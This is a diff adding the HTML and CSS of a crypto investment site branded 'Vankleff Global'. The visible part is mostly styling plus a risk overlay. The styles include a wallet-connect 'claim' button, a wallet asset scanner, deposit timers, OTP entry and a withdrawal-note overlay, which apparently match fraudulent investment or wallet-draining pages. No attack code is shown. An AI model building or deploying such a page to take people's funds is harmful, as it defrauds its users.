@@ -1,1 +1,984 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
+<meta name="description" content="Vankleff Global – Institutional Crypto Management from New York"/>
+<title>Vankleff Global – Institutional Crypto Management</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Inter','Segoe UI',sans-serif;background:#0d0d0d;color:#fff;overflow-x:hidden;}
+a{color:inherit;text-decoration:none;}
+button{cursor:pointer;border:none;outline:none;font-family:inherit;}
 
+#risk-overlay{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px;background:rgba(0,0,0,.92);}
+.risk-box{background:#161b2e;border:1px solid #c9a84c;border-radius:20px;padding:36px 28px;max-width:440px;width:100%;text-align:center;}
+.risk-icon{width:70px;height:70px;background:#2a2200;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 18px;}
+.risk-box h2{font-size:22px;font-weight:900;margin-bottom:14px;}
+.risk-box p{color:#ccc;font-size:13px;line-height:1.7;margin-bottom:10px;}
+.btn-risk{width:100%;padding:16px;background:#22c55e;border-radius:14px;color:#fff;font-size:16px;font-weight:800;margin-top:18px;}
+
+.lang-fixed{position:fixed;bottom:16px;left:16px;z-index:600;}
+.lang-trigger{background:#1a1a2e;border:1px solid #c9a84c;border-radius:10px;padding:8px 14px;color:#c9a84c;font-size:13px;font-weight:700;display:flex;align-items:center;gap:6px;}
+.lang-drop{position:absolute;bottom:44px;left:0;background:#1a1a2e;border:1px solid #333;border-radius:12px;padding:8px 0;min-width:200px;max-height:300px;overflow-y:auto;display:none;}
+.lang-drop.open{display:block;}
+.lang-opt{padding:9px 16px;font-size:13px;cursor:pointer;color:#ccc;}
+.lang-opt:hover{background:#2a2a3e;color:#22c55e;}
+
+.navbar{position:sticky;top:0;z-index:100;background:#111;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;border-bottom:1px solid #222;}
+.nav-logo{display:flex;align-items:center;gap:10px;}
+.logo-box{width:42px;height:42px;border:2px solid #c9a84c;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:18px;color:#c9a84c;flex-shrink:0;}
+.brand-name{font-size:13px;font-weight:800;color:#c9a84c;letter-spacing:1px;display:block;}
+.brand-sub{font-size:10px;color:#aaa;}
+.nav-btns{display:flex;gap:8px;}
+.btn-login{background:#1a1a2e;color:#fff;padding:9px 14px;border-radius:10px;font-size:12px;border:1px solid #333;}
+.btn-open{background:#22c55e;color:#fff;padding:9px 16px;border-radius:10px;font-size:12px;font-weight:700;}
+
+.page{display:none;}
+.page.active{display:block;}
+
+.hero{position:relative;min-height:100vh;display:flex;flex-direction:column;justify-content:flex-end;padding:0 0 70px;overflow:hidden;}
+.hero-bg{position:fixed;top:0;left:0;right:0;bottom:0;background:url('https://images.unsplash.com/photo-1534430480872-3498386e7856?w=1200&q=80') center 30%/cover no-repeat;z-index:-1;}
+.hero-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:linear-gradient(to bottom,rgba(0,0,0,.15) 0%,rgba(0,0,0,.25) 40%,rgba(13,13,13,.85) 75%,rgba(13,13,13,1) 100%);z-index:1;}
+.hero-content{position:relative;z-index:2;padding:0 20px;max-width:600px;}
+.about-curtain{position:relative;z-index:10;background:#0d0d0d;}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(26,26,46,.92);border:1px solid #444;border-radius:20px;padding:8px 14px;font-size:11px;color:#ccc;margin-bottom:22px;}
+.hero h1{font-size:32px;font-weight:900;line-height:1.2;margin-bottom:12px;text-shadow:0 2px 10px rgba(0,0,0,.9);}
+.hero h1 .g{color:#22c55e;}
+.hero h1 .b{color:#38bdf8;}
+.hero p{color:#e0e0e0;font-size:13px;line-height:1.6;margin-bottom:28px;text-shadow:0 1px 6px rgba(0,0,0,.9);}
+.btn-primary{background:#22c55e;color:#fff;padding:16px;border-radius:14px;font-size:15px;font-weight:700;text-align:center;display:block;width:100%;}
+.btn-secondary{background:rgba(26,26,46,.92);color:#fff;padding:16px;border-radius:14px;font-size:15px;font-weight:600;text-align:center;display:block;width:100%;border:1px solid #444;}
+
+.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:22px 20px;background:#111;position:relative;z-index:10;}
+.stat-card{background:#1a1a2e;border-radius:14px;padding:16px;}
+.stat-val{font-size:24px;font-weight:900;color:#22c55e;}
+.stat-lbl{font-size:11px;color:#aaa;margin-top:4px;}
+
+.section{padding:28px 20px;}
+.sec-label{font-size:11px;font-weight:700;color:#22c55e;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+.section h2{font-size:24px;font-weight:900;margin-bottom:14px;}
+.section p{color:#aaa;font-size:13px;line-height:1.7;margin-bottom:10px;}
+.check-list{list-style:none;}
+.check-list li{display:flex;align-items:center;gap:8px;color:#ccc;font-size:13px;padding:5px 0;}
+.check-list li::before{content:"✅";}
+
+.hq-card{background:#1a1a2e;border-radius:14px;padding:20px;margin:0 20px 20px;}
+.hq-top{display:flex;align-items:center;gap:12px;margin-bottom:16px;}
+.hq-icon{width:48px;height:48px;background:#2563eb;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;}
+.hq-card table{width:100%;border-collapse:collapse;}
+.hq-card tr{border-bottom:1px solid #2a2a3e;}
+.hq-card td{padding:10px 4px;font-size:12px;color:#aaa;}
+.hq-card td:last-child{color:#fff;text-align:right;}
+
+.svc-card{background:#1a1a2e;border-radius:14px;padding:18px;margin-bottom:12px;}
+.svc-icon{width:42px;height:42px;background:#16322c;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;margin-bottom:10px;}
+.svc-card h3{font-size:15px;font-weight:700;margin-bottom:6px;}
+.svc-card p{color:#aaa;font-size:12px;line-height:1.6;}
+
+.plan-card{background:#1a1a2e;border-radius:16px;padding:20px;margin-bottom:14px;position:relative;border:1px solid #2a2a3e;}
+.plan-card.pop{border:2px solid #22c55e;}
+.plan-card.best{border:2px solid #3b82f6;}
+.plan-badge{position:absolute;top:-11px;left:50%;transform:translateX(-50%);font-size:10px;font-weight:700;padding:3px 12px;border-radius:20px;color:#fff;}
+.pb-green{background:#22c55e;}
+.pb-blue{background:#3b82f6;}
+.plan-yield{font-size:36px;font-weight:900;color:#22c55e;margin:8px 0 2px;}
+.plan-sub{font-size:11px;color:#aaa;margin-bottom:14px;}
+.btn-gs{background:#1a1a2e;color:#fff;padding:12px;border-radius:12px;font-size:13px;font-weight:700;width:100%;border:1px solid #333;}
+
+.trust-card{background:#2A4767;border-radius:14px;padding:18px;margin-bottom:14px;display:flex;gap:14px;}
+.trust-av{width:56px;height:56px;border-radius:50%;object-fit:cover;flex-shrink:0;border:2px solid #c9a84c;}
+.trust-stars{color:#f59e0b;font-size:14px;margin-bottom:5px;}
+.trust-txt{font-size:12px;color:#e0e0e0;line-height:1.6;margin-bottom:8px;font-style:italic;}
+.trust-name{font-weight:700;font-size:13px;color:#c9a84c;}
+.trust-role{font-size:11px;color:#22c55e;}
+.trust-loc{font-size:10px;color:#aaa;}
+.tc{background:#1c2640;border-radius:14px;padding:16px;margin-bottom:12px;}
+
+.cta-box{background:#1a1a2e;border-radius:18px;padding:30px 22px;text-align:center;margin:20px;}
+.cta-logo{width:58px;height:58px;border:2px solid #c9a84c;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;color:#c9a84c;margin:0 auto 14px;}
+.btn-gold{background:linear-gradient(135deg,#c9a84c,#e5c068);color:#000;padding:15px;border-radius:14px;font-size:15px;font-weight:700;text-align:center;display:block;width:100%;margin-bottom:10px;}
+
+footer{background:#0d0d0d;border-top:1px solid #222;padding:26px 20px 90px;}
+footer h4{color:#fff;font-size:13px;font-weight:700;margin:12px 0 8px;}
+footer ul{list-style:none;}
+footer ul li{padding:3px 0;font-size:12px;color:#888;}
+.femail{color:#22c55e!important;}
+
+.legal-page{padding:24px 20px 60px;max-width:700px;margin:0 auto;}
+.legal-page h1{font-size:22px;font-weight:900;margin-bottom:6px;}
+.legal-meta{font-size:11px;color:#aaa;margin-bottom:22px;padding-bottom:14px;border-bottom:1px solid #222;}
+.legal-page h2{font-size:15px;font-weight:700;color:#c9a84c;margin:18px 0 8px;}
+.legal-page p{font-size:13px;color:#ccc;line-height:1.7;margin-bottom:10px;}
+
+/* MODALS */
+.modal-ov,.pm-ov,.conf-ov,.gm-ov,.cp-ov,.sup-ov,.proc-ov,.suc-ov,.wd-note-ov{display:none;position:fixed;inset:0;z-index:200;}
+.modal-ov.open,.pm-ov.open,.conf-ov.open,.gm-ov.open,.cp-ov.open,.sup-ov.open,.proc-ov.open,.suc-ov.open,.wd-note-ov.open{display:flex;}
+.modal-ov{background:rgba(0,0,0,.8);align-items:flex-end;justify-content:center;}
+.pm-ov{background:rgba(0,0,0,.75);z-index:250;align-items:flex-start;justify-content:center;padding-top:60px;}
+.conf-ov{background:rgba(0,0,0,.8);z-index:400;align-items:center;justify-content:center;}
+.gm-ov{background:rgba(0,0,0,.75);z-index:450;align-items:center;justify-content:center;padding:20px;}
+.sup-ov{background:rgba(0,0,0,.8);z-index:450;align-items:center;justify-content:center;padding:20px;}
+.proc-ov{background:rgba(0,0,0,.85);z-index:490;align-items:center;justify-content:center;}
+.suc-ov{background:rgba(0,0,0,.7);z-index:500;align-items:center;justify-content:center;}
+.wd-note-ov{background:rgba(0,0,0,.85);z-index:510;align-items:center;justify-content:center;padding:20px;}
+
+.modal-box{background:#161b2e;border-radius:20px 20px 0 0;padding:26px 22px 40px;width:100%;max-width:480px;position:relative;max-height:92vh;overflow-y:auto;}
+.modal-close{position:absolute;top:14px;right:16px;font-size:20px;color:#aaa;background:none;}
+.modal-logo{width:54px;height:54px;border:2px solid #c9a84c;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#c9a84c;margin:0 auto 10px;}
+.modal-title{color:#c9a84c;font-size:14px;font-weight:800;letter-spacing:1px;text-align:center;}
+.modal-sub{color:#aaa;font-size:11px;text-align:center;margin-bottom:18px;}
+.tab-row{display:flex;background:#0d0d0d;border-radius:12px;padding:4px;margin-bottom:18px;}
+.tab-btn{flex:1;padding:10px;border-radius:10px;font-size:13px;font-weight:600;background:none;color:#aaa;}
+.tab-btn.on{background:linear-gradient(135deg,#c9a84c,#e5c068);color:#000;}
+.fg{margin-bottom:12px;position:relative;}
+.fg input{width:100%;background:#1a1a2e;border:1px solid #2a2a3e;border-radius:12px;padding:13px 14px 13px 40px;color:#fff;font-size:13px;outline:none;}
+.fg input::placeholder{color:#555;}
+.fg .fi{position:absolute;left:13px;top:50%;transform:translateY(-50%);font-size:15px;color:#666;}
+.btn-submit{width:100%;padding:15px;border-radius:14px;background:linear-gradient(135deg,#c9a84c,#e5c068);color:#000;font-size:15px;font-weight:800;}
+.loading-spinner{display:none;text-align:center;padding:30px 20px;}
+.spinner-ring{width:52px;height:52px;border:4px solid #2a2a2a;border-top:4px solid #22c55e;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 14px;}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+
+/* DASHBOARD */
+.dash-nav{position:sticky;top:0;z-index:100;background:#111;display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-bottom:1px solid #222;}
+.ham{font-size:22px;color:#fff;background:none;}
+.dn-brand{display:flex;align-items:center;gap:8px;}
+.dn-logo{width:34px;height:34px;border:2px solid #c9a84c;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;color:#c9a84c;font-size:14px;}
+.dn-name{font-size:13px;font-weight:800;color:#c9a84c;}
+.dn-sub{font-size:10px;color:#888;display:block;}
+.av-circle{width:34px;height:34px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:14px;cursor:pointer;}
+.sb-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:150;}
+.sb-ov.open{display:block;}
+.sidebar{position:fixed;top:0;left:-300px;width:280px;height:100%;background:#0f1117;z-index:160;transition:left .3s;overflow-y:auto;padding-bottom:40px;}
+.sidebar.open{left:0;}
+.sb-top{display:flex;align-items:center;justify-content:space-between;padding:16px 18px;border-bottom:1px solid #1a1a2e;margin-bottom:8px;}
+.sb-close{font-size:20px;color:#aaa;background:none;}
+.sb-grp{font-size:10px;font-weight:700;color:#444;letter-spacing:2px;text-transform:uppercase;padding:12px 18px 4px;}
+.sb-item{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;cursor:pointer;border-radius:10px;margin:2px 8px;}
+.sb-item:hover,.sb-item.on{background:#1a2a1a;}
+.sb-left{display:flex;align-items:center;gap:12px;font-size:13px;color:#bbb;}
+.sb-item.on .sb-left{color:#22c55e;font-weight:600;}
+.sb-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;background:#1a1a2e;flex-shrink:0;}
+.sb-item.on .sb-icon{background:#16322c;}
+.sb-badge{font-size:10px;font-weight:700;padding:3px 10px;border-radius:20px;color:#fff;}
+.bl-live{background:#22c55e;}.bl-pro{background:#7c3aed;}.bl-ai{background:#2563eb;}.bl-prem{background:#f59e0b;}.bl-10{background:#22c55e;}
+.dash-content{padding:18px;}
+.balance-card{background:linear-gradient(135deg,#1a2a1a,#0d1a0d);border-radius:16px;padding:20px;margin-bottom:18px;border:1px solid #1f3a1f;}
+.bal-lbl{font-size:11px;color:#aaa;margin-bottom:4px;}
+.bal-amount{font-size:36px;font-weight:900;margin-bottom:18px;}
+.bal-btns{display:flex;gap:12px;}
+.btn-dep{background:#22c55e;color:#fff;padding:13px 24px;border-radius:10px;font-size:13px;font-weight:700;}
+.btn-wit{background:#2563eb;color:#fff;padding:13px 24px;border-radius:10px;font-size:13px;font-weight:700;}
+.mini-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px;}
+.mini-card{background:#1a1a2e;border-radius:14px;padding:14px;text-align:center;}
+.mc-val{font-size:17px;font-weight:800;color:#22c55e;}
+.mc-lbl{font-size:10px;color:#aaa;margin-top:4px;}
+.price-box{background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:18px;}
+.price-box h3{font-size:15px;font-weight:700;margin-bottom:12px;display:flex;align-items:center;gap:8px;}
+.ldot{width:8px;height:8px;border-radius:50%;background:#22c55e;animation:pulse 1.5s infinite;}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.pr{display:flex;align-items:center;justify-content:space-between;padding:9px 0;border-bottom:1px solid #222;}
+.pr:last-child{border-bottom:none;}
+.pr-l{display:flex;align-items:center;gap:10px;}
+.pr-ic{width:30px;height:30px;border-radius:50%;background:#16322c;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;color:#22c55e;}
+.pr-nm{font-size:13px;font-weight:600;}
+.pr-tk{font-size:10px;color:#666;}
+.pr-price{font-size:13px;font-weight:700;}
+.up{color:#22c55e;font-size:11px;}
+.dn2{color:#ef4444;font-size:11px;}
+
+/* WEB3 PANELS */
+.btn-cw{background:#22c55e;color:#fff;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:700;animation:cwblink 2s ease-in-out infinite;}
+@keyframes cwblink{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,.4)}50%{box-shadow:0 0 20px 8px rgba(34,197,94,.25)}}
+.wcta{background:#1a2a1a;border-radius:14px;padding:20px;text-align:center;margin-bottom:18px;}
+.btn-w3-claim{background:#eab308;color:#060e0a;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:700;display:none;}
+.btn-w3-disconnect{background:#ef4444;color:#fff;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:700;display:none;}
+.w3-btn-row{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-top:12px;}
+.web3-panels{margin-top:6px;}
+#statusText{margin-top:1.5rem;font-size:0.95rem;min-height:1.5rem;color:#94a3b8;text-align:center;}
+#stageLog{margin-top:0.75rem;font-size:0.78rem;color:#475569;font-family:monospace;text-align:left;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:0.75rem 1rem;max-height:140px;overflow-y:auto;display:none;}
+#stageLog.visible{display:block;}
+.log-line{padding:1px 0;}
+.log-ok{color:#22c55e;}.log-warn{color:#eab308;}.log-err{color:#f87171;}
+#infoPanel{display:none;margin-top:2rem;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:1.5rem;text-align:left;flex-direction:column;gap:0.8rem;}
+#infoPanel.visible{display:flex;}
+#txPanel{display:none;margin-top:1rem;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:16px;padding:1.2rem;text-align:left;}
+#txPanel.visible{display:block;}
+#scannerPanel{display:none;margin-top:1rem;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:16px;padding:1.2rem;text-align:left;}
+#scannerPanel.visible{display:block;}
+#errorBanner{display:none;margin-top:1rem;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:12px;padding:1rem;font-size:.85rem;color:#f87171;}
+#errorBanner.visible{display:block;}
+#chainSwitchBanner{display:none;margin-top:1rem;background:rgba(234,179,8,.1);border:1px solid rgba(234,179,8,.3);border-radius:12px;padding:1rem;font-size:.85rem;color:#eab308;text-align:center;}
+#chainSwitchBanner.visible{display:block;}
+.btn-switch-chain{margin-top:0.6rem;padding:8px 20px;font-size:.85rem;font-weight:700;border:none;border-radius:10px;cursor:pointer;background:#eab308;color:#060e0a;}
+.info-row{display:flex;justify-content:space-between;align-items:center;font-size:.88rem;gap:1rem;flex-wrap:wrap;}
+.info-label{color:#64748b;font-weight:500;}
+.info-value{color:#e2e8f0;font-weight:600;font-family:monospace;font-size:.85rem;text-align:right;word-break:break-all;}
+.divider{border:none;border-top:1px solid rgba(255,255,255,.06);}
+.badge{display:inline-block;padding:3px 10px;border-radius:8px;font-size:.75rem;font-weight:600;}
+.badge-green{background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.3);}
+.badge-yellow{background:rgba(234,179,8,.15);color:#eab308;border:1px solid rgba(234,179,8,.3);}
+.badge-blue{background:rgba(59,130,246,.15);color:#60a5fa;border:1px solid rgba(59,130,246,.3);}
+.scanner-title{font-size:.8rem;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.75rem;}
+.asset-item{display:flex;justify-content:space-between;align-items:center;padding:.4rem 0;font-size:.82rem;border-top:1px solid rgba(255,255,255,.04);}
+.asset-item:first-child{border-top:none;}
+.asset-symbol{color:#22c55e;font-weight:700;font-family:monospace;}
+.asset-balance{color:#e2e8f0;font-family:monospace;}
+.scan-status{font-size:.8rem;color:#64748b;}
+.tx-title{font-size:.8rem;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.75rem;}
+.tx-item{display:flex;justify-content:space-between;align-items:center;padding:.45rem 0;font-size:.82rem;}
+.tx-item+.tx-item{border-top:1px solid rgba(255,255,255,.04);}
+.tx-hash{font-family:monospace;color:#60a5fa;text-decoration:none;}
+.tx-status{font-size:.72rem;padding:2px 8px;border-radius:6px;font-weight:600;}
+.tx-pending{background:rgba(234,179,8,.12);color:#facc15;}
+.tx-confirmed{background:rgba(34,197,94,.12);color:#22c55e;}
+.tx-failed{background:rgba(239,68,68,.12);color:#f87171;}
+.story-card{background:#1c2640;border-radius:14px;padding:16px;margin:0 20px 12px;display:flex;gap:12px;}
+.st-av{width:46px;height:46px;border-radius:50%;object-fit:cover;flex-shrink:0;border:2px solid #c9a84c;}
+.btn-back{width:100%;padding:13px;border-radius:12px;font-size:13px;margin-top:12px;background:#1a1a2e;color:#ccc;}
+.ph{padding:22px 20px 8px;}
+.ph h1{font-size:22px;font-weight:900;}
+.ph p{font-size:12px;color:#aaa;margin-top:4px;}
+.warn-box{background:#2a1600;border:1px solid #f59e0b;border-radius:10px;padding:12px;margin-bottom:14px;display:flex;align-items:flex-start;gap:8px;}
+.warn-box p{font-size:11px;color:#f59e0b;line-height:1.5;}
+.dep-wrap{padding:18px;}
+.meth-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;}
+.meth{background:#1a1a2e;border:2px solid #2a2a3e;border-radius:12px;padding:16px 12px;display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;font-weight:700;color:#ccc;}
+.meth.sel{border-color:#22c55e;color:#22c55e;background:#0d1a0d;}
+.amt-input{background:#1a1a2e;border:1px solid #c9a84c;border-radius:12px;padding:14px;font-size:14px;color:#fff;width:100%;margin-bottom:12px;outline:none;}
+.quick-amts{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px;}
+.qa{background:#1a1a2e;border:1px solid #333;border-radius:8px;padding:8px 12px;color:#ccc;font-size:12px;font-weight:600;cursor:pointer;}
+.btn-cont{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;}
+.addr-box{background:#1a1a2e;border-radius:12px;padding:14px;margin-bottom:12px;}
+.addr-val{font-family:'Courier New',monospace;font-size:12px;color:#22c55e;word-break:break-all;line-height:1.5;margin-bottom:10px;}
+.addr-row{display:flex;gap:8px;align-items:center;}
+.btn-copy{flex:1;padding:10px;background:#2563eb;border-radius:10px;color:#fff;font-size:13px;font-weight:700;}
+.net-badge{background:#16322c;border:1px solid #22c55e;border-radius:8px;padding:6px 10px;font-size:11px;color:#22c55e;font-weight:700;white-space:nowrap;}
+.timer-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:16px;font-size:12px;color:#aaa;}
+.timer-val{color:#22c55e;font-weight:700;font-size:14px;}
+.proof-box{border:2px dashed #333;border-radius:14px;padding:26px;text-align:center;margin-bottom:16px;cursor:pointer;}
+.sec-notice{background:#2a1a0a;border:1px solid #f59e0b;border-radius:12px;padding:14px;margin-bottom:20px;}
+.code-box{background:#1a1a2e;border:1px solid #c9a84c;border-radius:14px;padding:18px;margin-bottom:18px;overflow:hidden;}
+.otp-row{display:flex;gap:6px;margin-bottom:14px;overflow:hidden;}
+.otp-in{flex:1;min-width:0;height:52px;background:#0d0d0d;border:2px solid #c9a84c;border-radius:10px;text-align:center;font-size:18px;color:#fff;outline:none;}
+.sig-card{background:#1a1a2e;border-radius:16px;padding:20px;margin:0 20px 14px;position:relative;}
+.sig-card.pop{border:2px solid #c9a84c;}
+.sig-price{font-size:30px;font-weight:900;color:#22c55e;margin:6px 0;}
+.sig-feats{list-style:none;margin-bottom:16px;}
+.sig-feats li{font-size:12px;color:#ccc;padding:3px 0;display:flex;align-items:center;gap:6px;}
+.sig-feats li::before{content:"✓";color:#22c55e;font-weight:700;}
+.btn-sub{width:100%;padding:13px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:700;}
+.plan-yield{font-size:36px;font-weight:900;color:#22c55e;margin:8px 0 2px;}
+.plan-sub{font-size:11px;color:#aaa;margin-bottom:14px;}
+.btn-gs{background:#1a1a2e;color:#fff;padding:12px;border-radius:12px;font-size:13px;font-weight:700;width:100%;border:1px solid #333;}
+.ip-item{background:#2d3a00;border-radius:16px;padding:18px;margin-bottom:14px;cursor:pointer;}
+.ps-card{background:#2d3a00;border-radius:16px;padding:20px;margin-bottom:16px;}
+.ps-amount{font-size:36px;font-weight:900;color:#22c55e;margin-bottom:12px;text-align:center;}
+input[type=range]{width:100%;accent-color:#22c55e;margin-bottom:6px;}
+.ps-sum{background:#1a2200;border-radius:12px;padding:14px;margin-bottom:16px;}
+.ps-row{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #2a3000;font-size:13px;}
+.ps-row:last-child{border-bottom:none;font-weight:800;}
+.ps-row span:last-child{color:#22c55e;}
+.ps-btns{display:flex;gap:10px;}
+.btn-psb{flex:1;padding:13px;background:#1a2200;border-radius:12px;color:#ccc;font-size:14px;}
+.btn-psi{flex:1;padding:13px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:800;}
+.ct-card{background:#2d3a00;border-radius:16px;padding:18px;margin-bottom:14px;}
+.ct-av{width:52px;height:52px;border-radius:50%;object-fit:cover;border:2px solid #c9a84c;}
+.ct-stats{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:10px 0;}
+.ct-stat{background:#1a2200;border-radius:10px;padding:10px;}
+.ct-stat-l{font-size:10px;color:#aaa;}
+.ct-stat-v{font-size:15px;font-weight:700;color:#22c55e;}
+.ref-hero{background:#2d3a00;border-radius:16px;padding:24px;text-align:center;margin-bottom:16px;}
+.ref-tiers{background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:16px;}
+.ref-tier{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #2a2a3e;}
+.ref-tier:last-child{border-bottom:none;}
+.ref-code{background:#2d3a00;border-radius:14px;padding:16px;margin-bottom:14px;}
+.ref-val{font-size:24px;font-weight:900;color:#22c55e;letter-spacing:3px;margin:8px 0;}
+.ref-link{display:flex;align-items:center;gap:8px;background:#1a2200;border-radius:10px;padding:10px;margin-top:8px;}
+.ref-link-txt{flex:1;font-size:11px;color:#aaa;word-break:break-all;}
+.ref-copy{background:#22c55e;border-radius:8px;padding:7px 12px;color:#fff;font-size:12px;font-weight:700;}
+.ref-stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;}
+.ref-stat{background:#2d3a00;border-radius:12px;padding:14px;text-align:center;}
+.ref-sv{font-size:22px;font-weight:900;color:#c9a84c;}
+.set-card{background:#3a4a00;border-radius:16px;padding:18px;margin-bottom:16px;}
+.set-inp{width:100%;background:#2a3800;border:1px solid #4a5a00;border-radius:10px;padding:12px 14px;color:#fff;font-size:13px;margin-top:6px;outline:none;}
+.btn-save{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:15px;font-weight:800;margin-top:14px;}
+.tf-card{background:#1a1a0a;border:1px solid #c9a84c;border-radius:16px;padding:20px;}
+.tf-in{width:100%;background:#0d0d0d;border:1px solid #333;border-radius:10px;padding:13px;color:#fff;font-size:14px;margin-bottom:12px;outline:none;}
+.stmt-filters{display:flex;gap:8px;overflow-x:auto;padding:14px 20px;scrollbar-width:none;}
+.sfbtn{flex-shrink:0;padding:8px 16px;border-radius:20px;font-size:12px;font-weight:700;background:#2d3a00;color:#ccc;}
+.sfbtn.on{background:#22c55e;color:#fff;}
+.st-item{background:#2d3a00;border-radius:12px;padding:14px 16px;margin:0 20px 10px;display:flex;align-items:center;justify-content:space-between;}
+.st-lft{display:flex;align-items:center;gap:12px;}
+.st-ico{width:38px;height:38px;border-radius:10px;background:#1a2200;display:flex;align-items:center;justify-content:center;font-size:18px;}
+.st-ttl{font-size:13px;font-weight:600;}
+.st-sub{font-size:10px;color:#aaa;margin-top:2px;}
+.st-amt{font-size:14px;font-weight:700;}
+.st-amt.p{color:#22c55e;}.st-amt.n{color:#ef4444;}
+.sbdg{font-size:10px;padding:2px 8px;border-radius:10px;margin-top:3px;display:inline-block;}
+.sp2{background:#3a2a00;color:#f59e0b;}
+.sc2{background:#1a2a1a;color:#22c55e;}
+.gm-box{border-radius:16px;padding:28px 24px;background:#2d3a00;width:100%;max-width:360px;text-align:center;position:relative;}
+.gm-close{position:absolute;top:12px;right:14px;font-size:18px;color:#aaa;background:none;}
+.btn-gm{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:800;margin-bottom:8px;}
+.btn-gmc{width:100%;padding:12px;background:transparent;border:none;color:#aaa;font-size:13px;}
+.btn-cd{width:100%;padding:15px;border-radius:12px;font-size:15px;font-weight:800;background:#22c55e;color:#fff;}
+.btn-verify{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;margin-top:16px;}
+.conf-box{background:#1a1a2e;text-align:center;max-width:300px;width:90%;border-radius:16px;padding:28px 24px;}
+.conf-btns{display:flex;gap:10px;margin-top:16px;}
+.btn-yes{flex:1;padding:13px;background:#ef4444;border-radius:12px;color:#fff;font-size:14px;font-weight:700;}
+.btn-no{flex:1;padding:13px;background:#1a2a1a;border-radius:12px;color:#ccc;font-size:14px;font-weight:600;border:1px solid #333;}
+.suc-box{background:#161b2e;text-align:center;max-width:340px;width:90%;border-radius:16px;padding:28px 24px;position:relative;}
+.suc-close{position:absolute;top:12px;right:16px;font-size:20px;color:#aaa;background:none;}
+.wd-note-box{background:#161b2e;border:1px solid #c9a84c;max-width:380px;width:90%;text-align:center;border-radius:16px;padding:28px 24px;position:relative;}
+</style>
+</head>
+<body>
+
+<div id="risk-overlay">
+  <div class="risk-box"><div class="risk-icon">⚠️</div><h2>Important Risk Disclosure</h2><p>Trading digital assets involves <strong>significant risk of loss</strong> and is not suitable for all investors.</p><p style="color:#888;font-size:12px;">You may lose some or all of your capital.</p><button class="btn-risk" onclick="acceptRisk()">I Understand and Accept</button></div>
+</div>
+
+<!-- LANDING PAGE -->
+<div id="page-landing" class="page active">
+  <div class="navbar"><div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span><span class="brand-sub">New York · Est. 2015</span></div></div><div class="nav-btns"><button class="btn-login" onclick="openAuth('signin')">Member Login</button><button class="btn-open" onclick="openAuth('create')">Open Account</button></div></div>
+  <div class="hero">
+    <div class="hero-bg"></div><div class="hero-overlay"></div>
